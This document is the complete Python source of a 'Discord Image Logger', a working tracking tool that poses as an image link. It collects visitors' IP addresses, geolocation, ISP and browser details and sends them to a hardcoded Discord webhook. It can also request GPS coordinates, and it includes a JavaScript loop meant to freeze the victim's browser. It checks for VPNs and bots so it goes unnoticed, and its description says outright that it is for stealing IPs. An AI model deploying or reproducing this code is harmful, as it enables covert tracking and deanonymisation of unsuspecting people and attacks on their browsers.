# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1382690513538256906/ltE4tcRccB0SlH8OrOqmxHENcAEJt8NPUmDcO1KUB9IgM7BLICYhPsRzWa8GH0-fbebY",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
